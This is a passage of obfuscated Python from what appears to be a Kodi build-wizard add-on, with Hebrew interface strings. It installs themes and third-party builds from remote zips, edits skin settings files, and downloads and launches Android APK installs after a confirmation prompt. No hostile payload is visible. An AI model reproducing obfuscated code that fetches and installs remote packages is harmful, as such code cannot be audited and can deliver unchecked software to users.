					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 );return #line:3760
			else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: None Found![/COLOR]'%COLOR2 )#line:3761
		else :OO0000O000OOOOO00 =DIALOG .yesno (ADDONTITLE ,'[COLOR %s]Would you like to install the theme:'%COLOR2 ,'[COLOR %s]%s[/COLOR]'%(COLOR1 ,theme ),'for [COLOR %s]%s v%s[/COLOR]?[/COLOR]'%(COLOR1 ,O0O00OOO000O00O00 ,wiz .checkBuild (O0O00OOO000O00O00 ,'version')),yeslabel ="[B][COLOR green]Install Theme[/COLOR][/B]",nolabel ="[B][COLOR red]Cancel Themes[/COLOR][/B]")#line:3762
		if OO0000O000OOOOO00 :#line:3763
			OOO000OO0000OOOOO =wiz .checkTheme (O0O00OOO000O00O00 ,theme ,'url')#line:3764
			O000000O00OO00O00 =O0O00OOO000O00O00 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3765
			if not wiz .workingURL (OOO000OO0000OOOOO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Invalid Zip Url![/COLOR]'%COLOR2 );return False #line:3766
			if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3767
			DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme ),'','Please Wait')#line:3768
			O00O0O0O000O0OO00 =os .path .join (PACKAGES ,'%s.zip'%O000000O00OO00O00 )#line:3769
			try :os .remove (O00O0O0O000O0OO00 )#line:3770
			except :pass #line:3771
			downloader .download (OOO000OO0000OOOOO ,O00O0O0O000O0OO00 ,DP )#line:3772
			xbmc .sleep (1000 )#line:3773
			DP .update (0 ,"","Installing %s "%O0O00OOO000O00O00 )#line:3774
			OOOOO0OOOO0000O0O =False #line:3775
			if url not in ["fresh","normal"]:#line:3776
				OOOOO0OOOO0000O0O =testTheme (O00O0O0O000O0OO00 )if not wiz .currSkin ()in ['skin.confluence','skin.myconfluence','skin.estuary','skin.mediacenter.mod','skin.mediacenter.nox','skin.phenomenal','skin.Premium.mod']else False #line:3777
				O00OOOOO0OO0O0OOO =testGui (O00O0O0O000O0OO00 )if not wiz .currSkin ()in ['skin.confluence','skin.myconfluence','skin.estuary','skin.mediacenter.mod','skin.mediacenter.nox','skin.phenomenal','skin.Premium.mod']else False #line:3778
				if OOOOO0OOOO0000O0O ==True :#line:3779
					wiz .lookandFeelData ('save')#line:3780
					OO00OO00O0000O0OO ='skin.confluence'if KODIV <17 else 'skin.estuary'if KODIV <17 else 'skin.mediacenter.mod'if KODIV <17 else 'skin.myconfluence'if KODIV <17 else 'skin.phenomenal'if KODIV <17 else 'skin.mediacenter.nox'if KODIV <17 else 'skin.Premium.mod'#line:3781
					O0OOOO00O0OO0OO00 =xbmc .getSkinDir ()#line:3782
					skinSwitch .swapSkins (OO00OO00O0000O0OO )#line:3784
					O00OOOO0O00000OO0 =0 #line:3785
					xbmc .sleep (1000 )#line:3786
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00OOOO0O00000OO0 <150 :#line:3787
						O00OOOO0O00000OO0 +=1 #line:3788
						xbmc .sleep (1000 )#line:3789
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3790
						wiz .ebi ('SendClick(11)')#line:3791
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:3792
					xbmc .sleep (1000 )#line:3793
			OOO00O0000O0OO0OO ='[COLOR %s][B]Installing Theme:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,theme )#line:3794
			DP .update (0 ,OOO00O0000O0OO0OO ,'','אנא המתן')#line:3795
			O00O000OO0O0OOO0O ,OO0OO0OO00O000OO0 ,OOOOO0O00000OO000 =extract .all (O00O0O0O000O0OO00 ,HOME ,DP ,title =OOO00O0000O0OO0OO )#line:3796
			wiz .setS ('buildtheme',theme )#line:3797
			wiz .log ('INSTALLED %s: [שגיאות:%s]'%(O00O000OO0O0OOO0O ,OO0OO0OO00O000OO0 ))#line:3798
			DP .close ()#line:3799
			if url not in ["fresh","normal"]:#line:3800
				wiz .forceUpdate ()#line:3801
				if KODIV >=17 :wiz .kodi17Fix ()#line:3802
				if O00OOOOO0OO0O0OOO ==True :#line:3803
					wiz .lookandFeelData ('save')#line:3804
					wiz .defaultSkin ()#line:3805
					O0OOOO00O0OO0OO00 =wiz .getS ('defaultskin')#line:3806
					skinSwitch .swapSkins (O0OOOO00O0OO0OO00 )#line:3807
					O00OOOO0O00000OO0 =0 #line:3808
					xbmc .sleep (1000 )#line:3809
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00OOOO0O00000OO0 <150 :#line:3810
						O00OOOO0O00000OO0 +=1 #line:3811
						xbmc .sleep (1000 )#line:3812
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3814
						wiz .ebi ('SendClick(11)')#line:3815
					wiz .lookandFeelData ('restore')#line:3816
				elif OOOOO0OOOO0000O0O ==True :#line:3817
					skinSwitch .swapSkins (O0OOOO00O0OO0OO00 )#line:3818
					O00OOOO0O00000OO0 =0 #line:3819
					xbmc .sleep (1000 )#line:3820
					while not xbmc .getCondVisibility ("Window.isVisible(yesnodialog)")and O00OOOO0O00000OO0 <150 :#line:3821
						O00OOOO0O00000OO0 +=1 #line:3822
						xbmc .sleep (1000 )#line:3823
					if xbmc .getCondVisibility ("Window.isVisible(yesnodialog)"):#line:3825
						wiz .ebi ('SendClick(11)')#line:3826
					else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Skin Swap Timed Out![/COLOR]'%COLOR2 );return #line:3827
					wiz .lookandFeelData ('restore')#line:3828
				else :#line:3829
					wiz .ebi ("ReloadSkin()")#line:3830
					xbmc .sleep (1000 )#line:3831
					wiz .ebi ("Container.Refresh")#line:3832
		else :#line:3833
			wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Theme Install: Cancelled![/COLOR]'%COLOR2 )#line:3834
def skin_homeselect ():#line:3838
	try :#line:3840
		OO00OOO00000OO0O0 =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3841
		OO0O0O0OOOOO00OOO =open (OO00OOO00000OO0O0 ,'r')#line:3843
		O000000000000OOOO =OO0O0O0OOOOO00OOO .read ()#line:3844
		OO0O0O0OOOOO00OOO .close ()#line:3845
		OOOOOO000O0OOO00O ='<setting id="HomeS" type="string(.+?)/setting>'#line:3846
		OOOO00OO00O0O0OOO =re .compile (OOOOOO000O0OOO00O ).findall (O000000000000OOOO )[0 ]#line:3847
		OO0O0O0OOOOO00OOO =open (OO00OOO00000OO0O0 ,'w')#line:3848
		OO0O0O0OOOOO00OOO .write (O000000000000OOOO .replace ('<setting id="HomeS" type="string%s/setting>'%OOOO00OO00O0O0OOO ,'<setting id="HomeS" type="string"></setting>'))#line:3849
		OO0O0O0OOOOO00OOO .close ()#line:3850
	except :#line:3851
		pass #line:3852
def skin_lower ():#line:3855
	O00O0OOO0O0O0OO00 =(ADDON .getSetting ("lower"))#line:3856
	if O00O0OOO0O0O0OO00 =='true':#line:3857
		try :#line:3860
			OOOO0OOO00OO0OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3861
			OO0OO0OO0OOOO0OOO =open (OOOO0OOO00OO0OOOO ,'r')#line:3863
			O0OO0000OOOO0000O =OO0OO0OO0OOOO0OOO .read ()#line:3864
			OO0OO0OO0OOOO0OOO .close ()#line:3865
			O0000000O0000000O ='<setting id="none_widget" type="bool(.+?)/setting>'#line:3866
			OO0O0O00O00O000O0 =re .compile (O0000000O0000000O ).findall (O0OO0000OOOO0000O )[0 ]#line:3867
			OO0OO0OO0OOOO0OOO =open (OOOO0OOO00OO0OOOO ,'w')#line:3868
			OO0OO0OO0OOOO0OOO .write (O0OO0000OOOO0000O .replace ('<setting id="none_widget" type="bool%s/setting>'%OO0O0O00O00O000O0 ,'<setting id="none_widget" type="bool">true</setting>'))#line:3869
			OO0OO0OO0OOOO0OOO .close ()#line:3870
			OOOO0OOO00OO0OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3872
			OO0OO0OO0OOOO0OOO =open (OOOO0OOO00OO0OOOO ,'r')#line:3874
			O0OO0000OOOO0000O =OO0OO0OO0OOOO0OOO .read ()#line:3875
			OO0OO0OO0OOOO0OOO .close ()#line:3876
			O0000000O0000000O ='<setting id="DisableOverlayColor" type="bool(.+?)/setting>'#line:3877
			OO0O0O00O00O000O0 =re .compile (O0000000O0000000O ).findall (O0OO0000OOOO0000O )[0 ]#line:3878
			OO0OO0OO0OOOO0OOO =open (OOOO0OOO00OO0OOOO ,'w')#line:3879
			OO0OO0OO0OOOO0OOO .write (O0OO0000OOOO0000O .replace ('<setting id="DisableOverlayColor" type="bool%s/setting>'%OO0O0O00O00O000O0 ,'<setting id="DisableOverlayColor" type="bool">true</setting>'))#line:3880
			OO0OO0OO0OOOO0OOO .close ()#line:3881
			OOOO0OOO00OO0OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3883
			OO0OO0OO0OOOO0OOO =open (OOOO0OOO00OO0OOOO ,'r')#line:3885
			O0OO0000OOOO0000O =OO0OO0OO0OOOO0OOO .read ()#line:3886
			OO0OO0OO0OOOO0OOO .close ()#line:3887
			O0000000O0000000O ='<setting id="backgroundwallpaper" type="bool(.+?)/setting>'#line:3888
			OO0O0O00O00O000O0 =re .compile (O0000000O0000000O ).findall (O0OO0000OOOO0000O )[0 ]#line:3889
			OO0OO0OO0OOOO0OOO =open (OOOO0OOO00OO0OOOO ,'w')#line:3890
			OO0OO0OO0OOOO0OOO .write (O0OO0000OOOO0000O .replace ('<setting id="backgroundwallpaper" type="bool%s/setting>'%OO0O0O00O00O000O0 ,'<setting id="backgroundwallpaper" type="bool">true</setting>'))#line:3891
			OO0OO0OO0OOOO0OOO .close ()#line:3892
			OOOO0OOO00OO0OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3896
			OO0OO0OO0OOOO0OOO =open (OOOO0OOO00OO0OOOO ,'r')#line:3898
			O0OO0000OOOO0000O =OO0OO0OO0OOOO0OOO .read ()#line:3899
			OO0OO0OO0OOOO0OOO .close ()#line:3900
			O0000000O0000000O ='<setting id="show.clearlogo" type="bool(.+?)/setting>'#line:3901
			OO0O0O00O00O000O0 =re .compile (O0000000O0000000O ).findall (O0OO0000OOOO0000O )[0 ]#line:3902
			OO0OO0OO0OOOO0OOO =open (OOOO0OOO00OO0OOOO ,'w')#line:3903
			OO0OO0OO0OOOO0OOO .write (O0OO0000OOOO0000O .replace ('<setting id="show.clearlogo" type="bool%s/setting>'%OO0O0O00O00O000O0 ,'<setting id="show.clearlogo" type="bool">false</setting>'))#line:3904
			OO0OO0OO0OOOO0OOO .close ()#line:3905
			OOOO0OOO00OO0OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3909
			OO0OO0OO0OOOO0OOO =open (OOOO0OOO00OO0OOOO ,'r')#line:3911
			O0OO0000OOOO0000O =OO0OO0OO0OOOO0OOO .read ()#line:3912
			OO0OO0OO0OOOO0OOO .close ()#line:3913
			O0000000O0000000O ='<setting id="show.cdart" type="bool(.+?)/setting>'#line:3914
			OO0O0O00O00O000O0 =re .compile (O0000000O0000000O ).findall (O0OO0000OOOO0000O )[0 ]#line:3915
			OO0OO0OO0OOOO0OOO =open (OOOO0OOO00OO0OOOO ,'w')#line:3916
			OO0OO0OO0OOOO0OOO .write (O0OO0000OOOO0000O .replace ('<setting id="show.cdart" type="bool%s/setting>'%OO0O0O00O00O000O0 ,'<setting id="show.cdart" type="bool">false</setting>'))#line:3917
			OO0OO0OO0OOOO0OOO .close ()#line:3918
			OOOO0OOO00OO0OOOO =os .path .join (xbmc .translatePath ("special://userdata"),"addon_data","skin.Premium.mod","settings.xml")#line:3922
			OO0OO0OO0OOOO0OOO =open (OOOO0OOO00OO0OOOO ,'r')#line:3924
			O0OO0000OOOO0000O =OO0OO0OO0OOOO0OOO .read ()#line:3925
			OO0OO0OO0OOOO0OOO .close ()#line:3926
			O0000000O0000000O ='<setting id="furniture.showhublogo" type="bool(.+?)/setting>'#line:3927
			OO0O0O00O00O000O0 =re .compile (O0000000O0000000O ).findall (O0OO0000OOOO0000O )[0 ]#line:3928
			OO0OO0OO0OOOO0OOO =open (OOOO0OOO00OO0OOOO ,'w')#line:3929
			OO0OO0OO0OOOO0OOO .write (O0OO0000OOOO0000O .replace ('<setting id="furniture.showhublogo" type="bool%s/setting>'%OO0O0O00O00O000O0 ,'<setting id="furniture.showhublogo" type="bool">false</setting>'))#line:3930
			OO0OO0OO0OOOO0OOO .close ()#line:3931
		except :#line:3936
			pass #line:3937
def thirdPartyInstall (OO000OOOO000O0000 ,O0O00O000000O0000 ):#line:3939
	if not wiz .workingURL (O0O00O000000O0000 ):#line:3940
		LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]Invalid URL for Build[/COLOR]'%COLOR2 );return #line:3941
	OOOO00O0OO0OO0O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to preform a [COLOR %s]Fresh Install[/COLOR] or [COLOR %s]Normal Install[/COLOR] for:[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),"[COLOR %s]%s[/COLOR]"%(COLOR1 ,OO000OOOO000O0000 ),yeslabel ="[B][COLOR green]Fresh Install[/COLOR][/B]",nolabel ="[B][COLOR red]Normal Install[/COLOR][/B]")#line:3942
	if OOOO00O0OO0OO0O0O ==1 :#line:3943
		freshStart ('third',True )#line:3944
	wiz .clearS ('build')#line:3945
	O0OOOO0O0O00OO00O =OO000OOOO000O0000 .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|','')#line:3946
	if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:3947
	DP .create (ADDONTITLE ,'[COLOR %s][B]Downloading:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000OOOO000O0000 ),'','אנא המתן')#line:3948
	OOO0OO0OO0OO0000O =os .path .join (PACKAGES ,'%s.zip'%O0OOOO0O0O00OO00O )#line:3949
	try :os .remove (OOO0OO0OO0OO0000O )#line:3950
	except :pass #line:3951
	downloader .download (O0O00O000000O0000 ,OOO0OO0OO0OO0000O ,DP )#line:3952
	xbmc .sleep (1000 )#line:3953
	O00OO000O000O00O0 ='[COLOR %s][B]Installing:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000OOOO000O0000 )#line:3954
	DP .update (0 ,O00OO000O000O00O0 ,'','אנא המתן')#line:3955
	O00OOO00O00O0OOOO ,OOO0000O0OOOOO0OO ,O0OOOOO0O00OO0OO0 =extract .all (OOO0OO0OO0OO0000O ,HOME ,DP ,title =O00OO000O000O00O0 )#line:3956
	if int (float (O00OOO00O00O0OOOO ))>0 :#line:3957
		wiz .fixmetas ()#line:3958
		wiz .lookandFeelData ('save')#line:3959
		wiz .defaultSkin ()#line:3960
		wiz .setS ('installed','true')#line:3962
		wiz .setS ('extract',str (O00OOO00O00O0OOOO ))#line:3963
		wiz .setS ('errors',str (OOO0000O0OOOOO0OO ))#line:3964
		wiz .log ('INSTALLED %s: [ERRORS:%s]'%(O00OOO00O00O0OOOO ,OOO0000O0OOOOO0OO ))#line:3965
		try :os .remove (OOO0OO0OO0OO0000O )#line:3966
		except :pass #line:3967
		if int (float (OOO0000O0OOOOO0OO ))>0 :#line:3968
			OOOOO0OOOO0O00O0O =DIALOG .yesno (ADDONTITLE ,'[COLOR %s][COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,OO000OOOO000O0000 ),'Completed: [COLOR %s]%s%s[/COLOR] [Errors:[COLOR %s]%s[/COLOR]]'%(COLOR1 ,O00OOO00O00O0OOOO ,'%',COLOR1 ,OOO0000O0OOOOO0OO ),'האם תרצה להציג שגיאות?[/COLOR]',nolabel ='[B][COLOR red]לא תודה[/COLOR][/B]',yeslabel ='[B][COLOR green]הצג שגיאות[/COLOR][/B]')#line:3969
			if OOOOO0OOOO0O00O0O :#line:3970
				if isinstance (OOO0000O0OOOOO0OO ,unicode ):#line:3971
					O0OOOOO0O00OO0OO0 =O0OOOOO0O00OO0OO0 .encode ('utf-8')#line:3972
				wiz .TextBox (ADDONTITLE ,O0OOOOO0O00OO0OO0 )#line:3973
	DP .close ()#line:3974
	if KODIV >=17 :wiz .addonDatabase (ADDON_ID ,1 )#line:3975
	if INSTALLMETHOD ==1 :OO000OOO00O00OO00 =1 #line:3976
	elif INSTALLMETHOD ==2 :OO000OOO00O00OO00 =0 #line:3977
	else :OO000OOO00O00OO00 =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]Would you like to [COLOR %s]Force close[/COLOR] kodi or [COLOR %s]Reload Profile[/COLOR]?[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ),yeslabel ="[B][COLOR green]Reload Profile[/COLOR][/B]",nolabel ="[B][COLOR red]Force Close[/COLOR][/B]")#line:3978
	if OO000OOO00O00OO00 ==1 :wiz .reloadFix ()#line:3979
	else :wiz .killxbmc (True )#line:3980
def testTheme (OO00OOOO000O0O000 ):#line:3982
	OO0O0OO0000O0O000 =zipfile .ZipFile (OO00OOOO000O0O000 )#line:3983
	for O00O0OO000O00O0O0 in OO0O0OO0000O0O000 .infolist ():#line:3984
		if '/settings.xml'in O00O0OO000O00O0O0 .filename :#line:3985
			return True #line:3986
	return False #line:3987
def testGui (OOOOO0O000O00OOO0 ):#line:3989
	OOO000O00OO0OOOOO =zipfile .ZipFile (OOOOO0O000O00OOO0 )#line:3990
	for OO000O0O0OOOOOOOO in OOO000O00OO0OOOOO .infolist ():#line:3991
		if '/guisettings.xml'in OO000O0O0OOOOOOOO .filename :#line:3992
			return True #line:3993
	return False #line:3994
def apkInstaller (O00OO00O0O0O00O0O ,O0OOO0O0OOOO000OO ):#line:3996
	wiz .log (O00OO00O0O0O00O0O )#line:3997
	wiz .log (O0OOO0O0OOOO000OO )#line:3998
	if wiz .platform ()=='android':#line:3999
		OOO0OO0000OO00O0O =DIALOG .yesno (ADDONTITLE ,"[COLOR %s]האם תרצה להוריד ולהתקין את:"%COLOR2 ,"[COLOR %s]%s[/COLOR]"%(COLOR1 ,O00OO00O0O0O00O0O ),yeslabel ="[B][COLOR green]התקן[/COLOR][/B]",nolabel ="[B][COLOR red]ביטול[/COLOR][/B]")#line:4000
		if not OOO0OO0000OO00O0O :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: Install Cancelled[/COLOR]'%COLOR2 );return #line:4001
		O000OO00O00O000OO =O00OO00O0O0O00O0O #line:4002
		if not os .path .exists (PACKAGES ):os .makedirs (PACKAGES )#line:4003
		if not wiz .workingURL (O0OOO0O0OOOO000OO )==True :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]APK Installer: Invalid Apk Url![/COLOR]'%COLOR2 );return #line:4004
		DP .create (ADDONTITLE ,'[COLOR %s][B]מוריד:[/B][/COLOR] [COLOR %s]%s[/COLOR]'%(COLOR2 ,COLOR1 ,O000OO00O00O000OO ),'','אנא המתן')#line:4005
		OO0O00OO00OOOO0OO =os .path .join (PACKAGES ,"%s.apk"%O00OO00O0O0O00O0O .replace ('\\','').replace ('/','').replace (':','').replace ('*','').replace ('?','').replace ('"','').replace ('<','').replace ('>','').replace ('|',''))#line:4006
		try :os .remove (OO0O00OO00OOOO0OO )#line:4007
		except :pass #line:4008
		downloader .download (O0OOO0O0OOOO000OO ,OO0O00OO00OOOO0OO ,DP )#line:4009
		xbmc .sleep (100 )#line:4010
		DP .close ()#line:4011
		notify .apkInstaller (O00OO00O0O0O00O0O )#line:4012
		wiz .ebi ('StartAndroidActivity("","android.intent.action.VIEW","application/vnd.android.package-archive","file:'+OO0O00OO00OOOO0OO +'")')#line:4013
	else :wiz .LogNotify ("[COLOR %s]%s[/COLOR]"%(COLOR1 ,ADDONTITLE ),'[COLOR %s]ERROR: None Android Device[/COLOR]'%COLOR2 )#line:4014
def createMenu (O00O0O0OO0000OO0O ,O0OO00000O00O0O00 ,OOOO0OOOO0O00O000 ):#line:4020
	if O00O0O0OO0000OO0O =='saveaddon':#line:4021
		O0OOO00O0OO000O0O =[]#line:4022
		O0O000000000OOOOO =urllib .quote_plus (O0OO00000O00O0O00 .lower ().replace (' ',''))#line:4023
		OO0000O000O00O0OO =O0OO00000O00O0O00 .replace ('Debrid','Real Debrid')#line:4024
		O0OOOOOO00O000000 =urllib .quote_plus (OOOO0OOOO0O00O000 .lower ().replace (' ',''))#line:4025
		OOOO0OOOO0O00O000 =OOOO0OOOO0O00O000 .replace ('url','URL Resolver')#line:4026
		O0OOO00O0OO000O0O .append ((THEME2 %OOOO0OOOO0O00O000 .title (),' '))#line:4027
		O0OOO00O0OO000O0O .append ((THEME3 %'Save %s Data'%OO0000O000O00O0OO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0O000000000OOOOO ,O0OOOOOO00O000000 )))#line:4028
		O0OOO00O0OO000O0O .append ((THEME3 %'Restore %s Data'%OO0000O000O00O0OO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0O000000000OOOOO ,O0OOOOOO00O000000 )))#line:4029
		O0OOO00O0OO000O0O .append ((THEME3 %'Clear %s Data'%OO0000O000O00O0OO ,'RunPlugin(plugin://%s/?mode=clear%s&name=%s)'%(ADDON_ID ,O0O000000000OOOOO ,O0OOOOOO00O000000 )))#line:4030
	elif O00O0O0OO0000OO0O =='save':#line:4031
		O0OOO00O0OO000O0O =[]#line:4032
		O0O000000000OOOOO =urllib .quote_plus (O0OO00000O00O0O00 .lower ().replace (' ',''))#line:4033
		OO0000O000O00O0OO =O0OO00000O00O0O00 .replace ('Debrid','Real Debrid')#line:4034
		O0OOOOOO00O000000 =urllib .quote_plus (OOOO0OOOO0O00O000 .lower ().replace (' ',''))#line:4035
		OOOO0OOOO0O00O000 =OOOO0OOOO0O00O000 .replace ('url','URL Resolver')#line:4036
		O0OOO00O0OO000O0O .append ((THEME2 %OOOO0OOOO0O00O000 .title (),' '))#line:4037
		O0OOO00O0OO000O0O .append ((THEME3 %'Register %s'%OO0000O000O00O0OO ,'RunPlugin(plugin://%s/?mode=auth%s&name=%s)'%(ADDON_ID ,O0O000000000OOOOO ,O0OOOOOO00O000000 )))#line:4038
		O0OOO00O0OO000O0O .append ((THEME3 %'Save %s Data'%OO0000O000O00O0OO ,'RunPlugin(plugin://%s/?mode=save%s&name=%s)'%(ADDON_ID ,O0O000000000OOOOO ,O0OOOOOO00O000000 )))#line:4039
		O0OOO00O0OO000O0O .append ((THEME3 %'Restore %s Data'%OO0000O000O00O0OO ,'RunPlugin(plugin://%s/?mode=restore%s&name=%s)'%(ADDON_ID ,O0O000000000OOOOO ,O0OOOOOO00O000000 )))#line:4040
		O0OOO00O0OO000O0O .append ((THEME3 %'Import %s Data'%OO0000O000O00O0OO ,'RunPlugin(plugin://%s/?mode=import%s&name=%s)'%(ADDON_ID ,O0O000000000OOOOO ,O0OOOOOO00O000000 )))#line:4041
		O0OOO00O0OO000O0O .append ((THEME3 %'Clear Addon %s Data'%OO0000O000O00O0OO ,'RunPlugin(plugin://%s/?mode=addon%s&name=%s)'%(ADDON_ID ,O0O000000000OOOOO ,O0OOOOOO00O000000 )))#line:4042
	elif O00O0O0OO0000OO0O =='install':#line:4043
		O0OOO00O0OO000O0O =[]#line:4044
		O0OOOOOO00O000000 =urllib .quote_plus (OOOO0OOOO0O00O000 )#line:4045
		O0OOO00O0OO000O0O .append ((THEME2 %OOOO0OOOO0O00O000 ,'RunAddon(%s, ?mode=viewbuild&name=%s)'%(ADDON_ID ,O0OOOOOO00O000000 )))#line:4046
		O0OOO00O0OO000O0O .append ((THEME3 %'Fresh Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=fresh)'%(ADDON_ID ,O0OOOOOO00O000000 )))#line:4047
		O0OOO00O0OO000O0O .append ((THEME3 %'Normal Install','RunPlugin(plugin://%s/?mode=install&name=%s&url=normal)'%(ADDON_ID ,O0OOOOOO00O000000 )))#line:4048
		O0OOO00O0OO000O0O .append ((THEME3 %'Apply guiFix','RunPlugin(plugin://%s/?mode=install&name=%s&url=gui)'%(ADDON_ID ,O0OOOOOO00O000000 )))#line:4049
		O0OOO00O0OO000O0O .append ((THEME3 %'Build Information','RunPlugin(plugin://%s/?mode=buildinfo&name=%s)'%(ADDON_ID ,O0OOOOOO00O000000 )))#line:4050
	O0OOO00O0OO000O0O .append ((THEME2 %'%s Settings'%ADDONTITLE ,'RunPlugin(plugin://%s/?mode=settings)'%ADDON_ID ))#line:4051
	return O0OOO00O0OO000O0O #line:4052
def toggleCache (O00OO0OO00OOO0O00 ):#line:4054
	O0O00OO0O00OO000O =['includevideo','includeall','includebob','includephoenix','includespecto','includegenesis','includeexodus','includeonechan','includesalts','includesaltslite']#line:4055
	O0OO0OOO0000OOO00 =['Include Video Addons','Include All Addons','Include Bob','Include Phoenix','Include Specto','Include Genesis','Include Exodus','Include One Channel','Include Salts','Include Salts Lite HD']#line:4056
	if O00OO0OO00OOO0O00 in ['true','false']:#line:4057
		for OO00OOO00OO0OO000 in O0O00OO0O00OO000O :#line:4058
			wiz .setS (OO00OOO00OO0OO000 ,O00OO0OO00OOO0O00 )#line:4059
	else :#line:4060
		if not O00OO0OO00OOO0O00 in ['includevideo','includeall']and wiz .getS ('includeall')=='true':#line:4061
			try :#line:4062
				OO00OOO00OO0OO000 =O0OO0OOO0000OOO00 [O0O00OO0O00OO000O .index (O00OO0OO00OOO0O00 )]#line:4063
				DIALOG .ok (ADDONTITLE ,"[COLOR %s]You will need to turn off [COLOR %s]Include All Addons[/COLOR] to disable[/COLOR] [COLOR %s]%s[/COLOR]"%(COLOR2 ,COLOR1 ,COLOR1 ,OO00OOO00OO0OO000 ))#line:4064
			except :#line:4065
				wiz .LogNotify ("[COLOR %s]Toggle Cache[/COLOR]"%COLOR1 ,"[COLOR %s]Invalid id: %s[/COLOR]"%(COLOR2 ,O00OO0OO00OOO0O00 ))#line:4066
		else :#line:4067
			OO000O0O0OO0OO000 ='true'if wiz .getS (O00OO0OO00OOO0O00 )=='false'else 'false'#line:4068
			wiz .setS (O00OO0OO00OOO0O00 ,OO000O0O0OO0OO000 )#line:4069
def playVideo (O0OO000O00O0O000O ):#line:4071
	wiz .log ("YouTube CCCCCCCCCCCCCCCCCCCCCCCCCCC URL: %s"%O0OO000O00O0O000O )#line:4072
	if 'watch?v='in O0OO000O00O0O000O :#line:4073
		OO00O0O00O0OO00O0 ,OO0OOOO0O0OOOOOO0 =O0OO000O00O0O000O .split ('?')#line:4074
		O0O0OOOO0O00000O0 =OO0OOOO0O0OOOOOO0 .split ('&')#line:4075
		for O00O0O0OOO0O000O0 in O0O0OOOO0O00000O0 :#line:4076
			if O00O0O0OOO0O000O0 .startswith ('v='):#line:4077
				O0OO000O00O0O000O =O00O0O0OOO0O000O0 [2 :]#line:4078
				break #line:4079
			else :continue #line:4080
	elif 'embed'in O0OO000O00O0O000O or 'youtu.be'in O0OO000O00O0O000O :#line:4081
		wiz .log ("YouTube BBBBBBBBBBBBBBBBBBBBBBBBB URL: %s"%O0OO000O00O0O000O )#line:4082
		OO00O0O00O0OO00O0 =O0OO000O00O0O000O .split ('/')#line:4083
		if len (OO00O0O00O0OO00O0 [-1 ])>5 :#line:4084
			O0OO000O00O0O000O =OO00O0O00O0OO00O0 [-1 ]#line:4085
		elif len (OO00O0O00O0OO00O0 [-2 ])>5 :#line:4086
			O0OO000O00O0O000O =OO00O0O00O0OO00O0 [-2 ]#line:4087
	wiz .log ("YouTube URL: %s"%O0OO000O00O0O000O )#line:4088
	yt .PlayVideo (O0OO000O00O0O000O )#line:4089
def viewLogFile ():#line:4091
	O000OO00OOO0OO0O0 =wiz .Grab_Log (True )#line:4092
	OOO000O0O00O0OO00 =wiz .Grab_Log (True ,True )#line:4093
	O0OO0O0OO000OO0O0 =0 ;OO00OOOO0O00O000O =O000OO00OOO0OO0O0 #line:4094
	if not OOO000O0O00O0OO00 ==False and not O000OO00OOO0OO0O0 ==False :#line:4095
		O0OO0O0OO000OO0O0 =DIALOG .select (ADDONTITLE ,["View %s"%O000OO00OOO0OO0O0 .replace (LOG ,""),"View %s"%OOO000O0O00O0OO00 .replace (LOG ,"")])#line:4096
		if O0OO0O0OO000OO0O0 ==-1 :wiz .LogNotify ('[COLOR %s]View Log[/COLOR]'%COLOR1 ,'[COLOR %s]View Log Cancelled![/COLOR]'%COLOR2 );return #line:4097
